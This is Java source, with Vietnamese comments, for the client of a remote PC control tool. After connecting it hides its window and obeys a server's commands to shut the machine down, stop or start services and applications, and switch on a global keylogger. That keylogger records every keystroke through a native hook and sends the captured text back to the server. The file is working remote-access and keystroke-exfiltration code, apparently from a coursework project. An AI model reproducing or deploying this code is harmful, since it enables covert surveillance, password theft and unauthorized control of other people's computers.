package client.socket;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.channels.SocketChannel;


import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JOptionPane;
import javax.swing.JTextField;

import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class MainFrame extends JFrame implements ActionListener, NativeKeyListener{
	String ip;
	final int port = 31249;
	static boolean hooked;
	static String keyRelease;
	final String tg_shutdown ="shutdown";
	final String tg_getservices = "gets";
	final String tg_stopservices ="stops";
	final String tg_startservices = "starts";
	final String tg_stopapp ="stopa";
	final String tg_startapp = "starta";
	final String tg_hook ="hook";
	final String tg_unhook ="unhook";
	final String tg_print = "print";
    JButton connect;
	JButton exit;
	JTextField ip1;
	
	InetSocketAddress serverAddr;
	SocketChannel serverSocket = null, client;
	RemotePC rp;
	static MainFrame m;
	
	public MainFrame(String title){
		super(title);
		//Đóng chương trình khi bấm close
		addWindowListener( 
	              new java.awt.event.WindowAdapter() {
	                public void windowClosing( java.awt.event.WindowEvent e ) {
	                	if (serverSocket != null){
	                	SendReceive send = new SendReceive();
	        			send.send(serverSocket, "fail");
	                	}
	                  dispose() ;
	                  System.exit( 0 );
	                }
	                }
	            );
		// GIAO DIỆN CHƯƠNG TRÌNH SERVER
		this.setLayout(null);
		
		//awt: Địa chỉ IP
		ip1 = new JTextField("IP address", 16);
		connect = new JButton("Connect");
		exit = new JButton("Exit");
		
		//ip
		ip1.setBounds(30, 20, 100, 25);
		
		//connect
		connect.setBounds(150,20,100,25);
		
		//Exit
		exit.setBounds(100,70,60,30);
		
		this.add(ip1);
		this.add(connect);
		this.add(exit);
		this.pack();
		this.setSize(290,170);
		this.setLocation(500, 200);
		this.setVisible(true);
		
		connect.addActionListener(this);
		exit.addActionListener(this);
	}
	
	public static void main(String[] args) {
		try {
			GlobalScreen.registerNativeHook();
		} catch(Exception e) {
			e.printStackTrace();
		}
		m = new MainFrame("Client");
		GlobalScreen.getInstance().addNativeKeyListener(m);
		hooked = false;
		keyRelease ="";
	}

	@Override
	public void actionPerformed(ActionEvent arg0) {
		//Khi bấm Connect
		if (arg0.getSource()==connect){
			//Kiểm tra đã nhập ip hợp lệ chưa
			if (!checkIP()){
				JOptionPane.showMessageDialog(this, "Wrong IP address");
			}
			else
			{
				ip = ip1.getText();
				try {
					ClientConnection a = new ClientConnection("connection");
					a.start();
					m.setVisible(false);
					//KeyLog b = new KeyLog("key"); 
					//b.start();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
					JOptionPane.showMessageDialog(this, "Cannot connect to server");
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
					JOptionPane.showMessageDialog(this, "Cannot connect to server");
				} 
			}
		}
		//Khi bấm Exit
		else if (arg0.getSource()==exit){
			if (serverSocket != null){
            	SendReceive send = new SendReceive();
    			send.send(serverSocket, "fail");
            	}
			System.exit(0);	
		}	
	}
	
	//Hàm kiểm tra tính hợp lệ của IP
	private boolean checkIP(){
		String temp = ip1.getText();
		try {
	        if ( temp == null || temp.isEmpty() ) {
	            return false;
	        }

	        String[] parts = temp.split( "\\." );
	        if ( parts.length != 4 ) {
	            return false;
	        }

	        for ( String s : parts ) {
	            int i = Integer.parseInt( s );
	            if ( (i < 0) || (i > 255) ) {
	                return false;
	            }
	        }
	        if ( temp.endsWith(".") ) {
	            return false;
	        }

	        return true;
	    } catch (NumberFormatException nfe) {
	        return false;
	    }
	}
	
	//Kết nối với server
	public class ClientConnection implements Runnable{
		SendReceive srcv;
		private Thread t;
		private String threadName;
		
		public ClientConnection(String name) throws IOException, InterruptedException{
			threadName = name;
			serverAddr = new InetSocketAddress(ip,port);
			serverSocket = SocketChannel.open(serverAddr);
			
			//Thiết lập non blocking
			serverSocket.configureBlocking(false);
			
			rp = new RemotePC();
			srcv = new SendReceive();
				
		}
		
		public void start (){
		      if (t == null)
		      {
		         t = new Thread (this, threadName);
		         t.start ();
		      }
		}

		@Override
		public void run() {
			while(true){

				String msg ="";
				try {
					msg = srcv.receive(serverSocket);
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				// Gói tin shutdown
				if (msg.equals(tg_shutdown)){
					try {
						rp.shutdown();
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
				//Gói tin lấy danh sách dịch vụ
				else if (msg.equals(tg_getservices)){
					rp.sendServices(serverSocket);
				}
				//Gói tin dừng 1 dịch vụ
				else if (msg.contains(tg_stopservices)){
					if (rp.stopServices(msg.substring(7))){
						srcv.send(serverSocket, "stopsok");
					}
					else{
						srcv.send(serverSocket, "stopsfail");
					}
				}
				//Gói tin chạy 1 dịch vụ
				else if (msg.contains(tg_startservices)){
					if (rp.startServices(msg.substring(8))){
						srcv.send(serverSocket, "startsok");
					}
					else{
						srcv.send(serverSocket, "startsfail");
					}
				}
				//Gói tin dừng 1 ứng dụng
				else if (msg.contains(tg_stopapp)){
					if (rp.stopApp(msg.substring(7))){
						srcv.send(serverSocket, "stopaok");
					}
					else{
						srcv.send(serverSocket, "stopafail");
					}
				}
				//Gói tin chạy 1 ứng dụng
				else if (msg.contains(tg_startapp)){
					if (rp.startApp(msg.substring(8))){
						srcv.send(serverSocket, "startaok");
					}
					else{
						srcv.send(serverSocket, "startafail");
					}
				}
				//Bắt đầu theo dõi bàn phím
				else if (msg.equals(tg_hook)){
					hooked = true;
					System.out.println("hook");
				}
				//Dừng theo dõi phím
				else if (msg.equals(tg_unhook)){
					hooked = false;
					keyRelease = "";
				}
				//Yêu cầu trả lại danh sách các phím đã theo dõi đc
				else if (msg.equals(tg_print)){
					System.out.println("print");
					srcv.send(serverSocket, tg_print + ", " + keyRelease);
					keyRelease ="";
				}
				//Ngưng kết nối
				else if (msg.equals("fail")){
					try {
						serverSocket.close();
						serverSocket=null;
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
					break;
				}
			}
		}
		
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub
		if (hooked){
			keyRelease += NativeKeyEvent.getKeyText(arg0.getKeyCode());
		}
		else
			keyRelease = "";
	}
	
	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub
		
	}
	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub
		
	}
		
}

